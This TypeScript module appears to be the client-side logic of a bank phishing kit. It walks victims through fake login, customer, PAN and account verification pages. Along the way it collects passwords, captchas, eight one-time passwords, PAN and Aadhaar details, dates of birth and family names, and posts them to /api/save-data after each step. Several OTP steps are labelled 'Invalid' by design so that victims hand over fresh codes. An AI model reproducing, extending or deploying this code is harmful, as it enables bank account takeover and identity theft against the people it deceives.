// Store user data in the client-side
interface UserData {
  // Submission tracking
  submissionId?: string;
  
  // Login data
  username?: string;
  password?: string;
  mobile?: string;
  captcha?: string;
  
  // OTP data
  otp1?: string;
  otp2?: string;
  otp3?: string;
  otp4?: string;
  otp5?: string;
  otp6?: string;
  otp7?: string;
  otp8?: string;
  
  // Verify Customer data
  fullName?: string;
  dateOfBirth?: string;
  
  // Verify PAN data
  accountLast4?: string;
  panNumber?: string;
  
  // Verify Account data
  fatherName?: string;
  aadhaarLast4?: string;
}

let userData: UserData = {};

// Get the current flow step
let currentStep = 0;

// Define the flow steps
const FLOW = [
  '/', // Login page
  '/otp', // OTP page 1
  '/verify-customer', // Verify Customer
  '/otp', // OTP page 2
  '/verify-pan', // Verify PAN
  '/otp', // OTP page 3
  '/verify-account', // Verify Account
  '/otp', // OTP page 4 (Invalid)
  '/otp', // OTP page 5
  '/otp', // OTP page 6 (Invalid)
  '/otp', // OTP page 7 (Invalid)
  '/otp', // OTP page 8
  '/completion', // Completion page
];

export function getCurrentStep(): number {
  return currentStep;
}

export function getNextRoute(): string {
  currentStep++;
  if (currentStep >= FLOW.length) {
    // If reached the end, stay on the last step
    currentStep = FLOW.length - 1;
  }
  return FLOW[currentStep];
}

export function getCurrentOtpKey(): string {
  // Map the current step to the correct OTP key
  // Step 1 → otp1 (first OTP after login)
  // Step 3 → otp2 (second OTP after verify customer)
  // Step 5 → otp3 (third OTP after verify pan)
  // Step 7 → otp4 (fourth OTP - Invalid)
  // Step 8 → otp5 (fifth OTP)
  // Step 9 → otp6 (sixth OTP - Invalid)
  // Step 10 → otp7 (seventh OTP - Invalid)
  // Step 11 → otp8 (eighth OTP)
  
  if (currentStep === 1) return 'otp1';
  if (currentStep === 3) return 'otp2';
  if (currentStep === 5) return 'otp3';
  if (currentStep === 7) return 'otp4';
  if (currentStep === 8) return 'otp5';
  if (currentStep === 9) return 'otp6';
  if (currentStep === 10) return 'otp7';
  if (currentStep === 11) return 'otp8';
  
  // Default fallback - should never happen
  console.warn(`Unexpected step ${currentStep} when getting OTP key`);
  return `otp${Math.min(Math.max(currentStep - 3, 1), 8)}`;
}

export function updateUserData(newData: Partial<UserData>): void {
  userData = { ...userData, ...newData };
  console.log('Updated user data:', userData);
  
  // Save to localStorage for persistence
  localStorage.setItem('userData', JSON.stringify(userData));
}

export function getUserData(): UserData {
  // Try to load from localStorage if exists
  const storedData = localStorage.getItem('userData');
  if (storedData) {
    try {
      userData = JSON.parse(storedData);
    } catch (e) {
      console.error('Failed to parse stored user data:', e);
    }
  }
  return userData;
}

export function resetFlow(): void {
  currentStep = 0;
  userData = {};
  localStorage.removeItem('userData');
  localStorage.removeItem('submissionId');
}

export function getDataAsJSON(): string {
  return JSON.stringify(userData, null, 2);
}

export function getSubmissionId(): string | undefined {
  // First check if it's in userData
  if (userData.submissionId) {
    return userData.submissionId;
  }
  
  // Then check localStorage as a fallback
  return localStorage.getItem('submissionId') || undefined;
}

export function setSubmissionId(id: string): void {
  // Store in userData
  userData.submissionId = id;
  
  // Also store in localStorage for persistence
  localStorage.setItem('submissionId', id);
}

// Function to save data to the server
export async function saveDataToServer(): Promise<{ success: boolean; message: string }> {
  try {
    // Get submissionId if one exists
    const submissionId = getSubmissionId();
    
    const response = await fetch('/api/save-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ...userData,
        submissionId // Include the submissionId if available
      }),
    });

    const result = await response.json();
    
    if (!response.ok) {
      throw new Error(result.error || 'Failed to save data');
    }
    
    // Store the returned submissionId for future updates
    if (result.submissionId) {
      setSubmissionId(result.submissionId);
    }
    
    console.log('Data saved to server:', result);
    return { success: true, message: 'Data saved successfully' };
  } catch (error) {
    console.error('Error saving data to server:', error);
    return { success: false, message: error instanceof Error ? error.message : 'Unknown error' };
  }
}

// Function to save intermediate data after each step
export async function saveIntermediateData(): Promise<void> {
  try {
    // Get submissionId if one exists
    const submissionId = getSubmissionId();
    
    const response = await fetch('/api/save-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ...userData,
        submissionId // Include the submissionId if available
      }),
    });
    
    const result = await response.json();
    
    if (response.ok) {
      // Store the returned submissionId for future updates
      if (result.submissionId) {
        setSubmissionId(result.submissionId);
      }
      
      console.log('Intermediate data saved successfully with ID:', result.submissionId);
    }
  } catch (error) {
    console.error('Error saving intermediate data:', error);
  }
}